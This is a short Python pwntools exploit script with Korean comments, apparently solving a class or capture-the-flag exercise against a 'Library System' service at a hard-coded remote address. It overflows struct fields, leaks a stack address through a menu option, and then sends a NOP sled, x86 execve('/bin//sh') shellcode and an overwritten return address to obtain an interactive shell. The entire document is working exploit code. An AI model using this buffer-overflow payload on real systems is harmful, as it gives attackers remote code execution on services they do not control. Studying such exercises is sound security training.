from pwn import *

# 연결
r = remote('128.134.83.160', 41402)

# Step 1: 조건 충족 + 스택 주소 leak
r.sendlineafter(b"Library System Menu ===", b"1")
payload = b"A" * 32      # youngjae.name
payload += b"B" * 4      # student_id
payload += b"N"          # youngjae.is_overdue
payload += b"C" * 3      # padding
payload += b"D" * 32     # seogyeong.name
payload += b"E" * 4      # seogyeong.student_id
payload += b"Y"          # seogyeong.is_overdue
payload += b"C" * 3      # padding
r.send(payload)

# Step 2: get_system_info() 통해 leak 받기
r.sendlineafter(b"Library System Menu ===", b"3")
r.recvuntil(b"Stack address: ")
leak = int(r.recvline().strip(), 16)
print(f"[+] Leak: {hex(leak)}")

# Step 3: 두 번째 borrow_book 시도 (exploit)
r.sendlineafter(b"Library System Menu ===", b"1")

offset_to_ret = 88
offset_to_shellcode = 16
ret_addr = leak + offset_to_shellcode

# 교수님 쉘코드 삽입
shellcode = (
    b"\x31\xc0\x50\x68\x6e\x2f\x73\x68"
    b"\x68\x2f\x2f\x62\x69\x89\xe3\x31"
    b"\xc9\x31\xd2\xb0\x08\x40\x40\x40"
    b"\xcd\x80"
)

nop_sled = b"\x90" * offset_to_shellcode
padding_len = offset_to_ret - len(nop_sled + shellcode)
payload2 = nop_sled + shellcode + b'A' * padding_len
payload2 += b'B' * 4  # SFP
payload2 += p32(ret_addr)  # RET → NOP sled 중간

# Step 4: shell 획득
r.send(payload2)
r.interactive()
